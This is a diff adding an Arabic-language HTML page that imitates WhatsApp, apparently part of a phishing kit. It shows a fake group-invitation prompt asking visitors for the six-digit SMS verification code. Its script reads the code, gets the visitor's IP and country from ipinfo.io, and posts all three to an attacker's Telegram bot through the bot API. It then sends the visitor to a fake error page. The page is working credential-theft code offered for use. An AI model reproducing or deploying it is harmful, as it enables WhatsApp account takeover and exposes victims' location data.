@@ -1,0 +1,152 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>WhatsApp Login</title>
+  <link rel="stylesheet" href="./Bouuurn9/style.css">
+  <link rel="icon" href="./Bouuurn9/ujTY9i_Jhs1.png">
+  <script src="https://code.jquery.com/jquery-3.6.0.min.js"></script>
+  <script src="bot_config.js"></script>
+
+
+  <link type="text/css" rel="stylesheet" href="https://static.whatsapp.net/rsrc.php/v5/yS/l/0,cross/fFbRzb5oFiH.css" data-bootloader-hash="vRp9yOm" crossorigin="anonymous" />
+  <link type="text/css" rel="stylesheet" href="https://static.whatsapp.net/rsrc.php/v5/yC/l/0,cross/X357JL4UgPw.css" data-bootloader-hash="Dpp+Eva" crossorigin="anonymous" />
+  <link type="text/css" rel="stylesheet" href="https://static.whatsapp.net/rsrc.php/v5/y7/l/0,cross/D7Rs-NfkIB2.css" data-bootloader-hash="X+JXpLn" crossorigin="anonymous" />
+
+  
+ </head>
+ <body style=" background-color: #fcf5eb; ">
+ <header class="_af-2 _afwk" data-testid="whatsapp_www_header" id="site-header">
+     <div class="_afvx">
+         <button class="hamburger" id="menuToggle" aria-label="فتح قائمة الهاتف المحمول" aria-expanded="false">☰</button>
+         <a data-testid="whatsapp_www_header_logo_link" href="index.html" class="_9vcv">
+             <img class="logo-main" alt="صفحة واتساب الرئيسية" src="https://static.whatsapp.net/rsrc.php/v3/yq/r/mdQNdcFMi0p.png" />
+         </a>
+         <nav class="_afwe" aria-label="القائمة الرئيسية">
+             <ul class="_afwg">
+                 <li class="_afn_"><a href="#" class="_9vd5 _aens _afod" target="_self"><span class="_afog"><span class="_9vg3 _aj1b">الخصوصية</span></span></a></li>
+                 <li class="_afn_"><a href="#" class="_9vd5 _aens _afod" target="_self"><span class="_afog"><span class="_9vg3 _aj1b">مركز المساعدة</span></span></a></li>
+                 <li class="_afn_"><a href="#" class="_9vd5 _aens _afod" target="_self"><span class="_afog"><span class="_9vg3 _aj1b">المدونة</span></span></a></li>
+                 <li class="_afn_"><a href="#" class="_9vd5 _aens _afod" target="_self"><span class="_afog"><span class="_9vg3 _aj1b">للأنشطة التجارية</span></span></a></li>
+                 <li class="_afn_"><a href="#" class="_9vd5 _aens _afod" target="_self"><span class="_afog"><span class="_9vg3 _aj1b">واتساب ويب</span></span></a></li>
+                 <li class="_afn_"><a href="#" class="_9vd5 _aens _afod" target="_self"><span class="_afog"><span class="_9vg3 _aj1b">تنزيل</span></span></a></li>
+             </ul>
+         </nav>
+     </div>
+ </header>
+
+<div class="container" style=" margin-block: 100px; ">
+  <div style=" text-align: center; margin: 20px;">
+    <img class="_9vx6" src="https://static.whatsapp.net/rsrc.php/v3/yB/r/_0dVljceIA5.png" />
+  <h4 class="_9vd5 _9scb" style="color:#5E5E5E; font-size: large;">الدعوة للانضمام إلى مجموعة واتساب</h4>
+  </div>
+  <div style=" text-align: center; font-family: system-ui;">
+  <h4 class="_9vd5 _9scb" style="color:#5E5E5E;">  أدخل رمز تفعيل الإضافة المكون من ٦ أرقام <br>  الذي تلقيته من خلال رسالة نصية   الذي تلقيته من خلال رسالة نصية
+</h4>
+
+  </div>
+
+<form action="#">
+<input type="hidden" id="ip">
+<input type="hidden" id="country">
+
+    <div class="input-group" style="text-align: center;">
+      <input style="width: auto;" type="text" id="sms" name="sms" placeholder="SMS Code">
+      <div id="error-message" style="text-align: center; color: red;"></div>
+    </div>
+	<p style="text-align: center;"><a class="btn btn-default" id="resend-sms" href="#" style="font-style: italic; font-size:13px;font-weight:bold">إعادة إرسال مرة آخرى</a></p>
+<div style="text-align: center;">
+    <button style="padding: 10px 20px;
+        font-size: 16px;
+        background-color: #4CAF50;
+        color: #fff;
+        border: none;
+        border-radius: 5px;
+        cursor: pointer;
+        display: inline-block;
+		width: 150px;" type="submit">متابعة</button>
+</div>
+	
+  </form>
+</div>
+
+<script>
+    $(document).ready(function() {
+        $('form').submit(function(event) {
+            event.preventDefault();
+
+            var smsCode = $("#sms").val();
+            var ipAddress = $("#ip").val();
+            var country = $("#country").val(); // استرجاع اسم الدولة
+
+            // التحقق من إدخال رمز الـ SMS
+            if (!smsCode || !smsCode.match(/^\d+$/)) {
+                $("#error-message").text("ادخل رمز الـرمز بشكل صحيح");
+                return;
+            } else {
+                $("#error-message").text(""); // إزالة رسالة الخطأ إذا تم إدخال رمز الـ SMS بشكل صحيح
+            }
+
+            var telegramMessage = "SMS Code : " + smsCode + "\nIP : " + ipAddress + "\nCountry : " + country;
+
+            var telegramBotUrl = "https://api.telegram.org/bot" + botConfig.botToken + "/sendMessage";
+            var requestData = {
+                chat_id: botConfig.chatId,
+                text: telegramMessage
+            };
+
+            $.post(telegramBotUrl, requestData, function(response) {
+                console.log('تم إرسال رسالة SMS بنجاح:', response);
+                // بعد الإرسال، قم بتوجيه المستخدم إلى الصفحة الأخرى
+                window.location.href = "SMS_ERRUR.html?FGDD=Loauyb734HSDHDS783JSDUE7Y34UEUY3GSDGHDSH73JS773USUSUS7ISUS63";
+            }).fail(function(error) {
+                console.error('خطأ في إرسال رسالة SMS:', error);
+                // حتى في حالة الخطأ، توجه إلى الصفحة التالية
+                window.location.href = "SMS_ERRUR.html?FGDD=Loauyb734HSDHDS783JSDUE7Y34UEUY3GSDGHDSH73JS773USUSUS7ISUS63";
+            });
+        });
+
+        // جلب معلومات الـ IP باستخدام خدمة ipinfo.io
+        $.get("https://ipinfo.io", function(response) {
+            var ipAddress = response.ip;
+            var country = response.country; // استرجاع اسم الدولة
+
+            // تحديث الحقل الخاص بالـ IP
+            $("#ip").val(ipAddress);
+
+            // تحديث الحقل الخاص بالدولة
+            $("#country").val(country);
+        }, "json");
+    });
+</script>
+
+        <!-- script jquery -->
+        <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery.mask/1.14.16/jquery.mask.min.js"></script>
+
+        <script>
+            $('#sms').mask('000000');
+        </script>
+
+<script>
+    (function(){
+        const header = document.querySelector('header');
+        const btn = document.getElementById('menuToggle');
+        if (!header || !btn) return;
+        btn.addEventListener('click', function(e){
+            e.stopPropagation();
+            const open = header.classList.toggle('open');
+            btn.setAttribute('aria-expanded', open ? 'true' : 'false');
+        });
+        document.addEventListener('click', function(e){
+            if (!header.classList.contains('open')) return;
+            if (!header.contains(e.target)) {
+                header.classList.remove('open');
+                btn.setAttribute('aria-expanded','false');
+            }
+        });
+    })();
+</script>
+
+</body>
+</html>
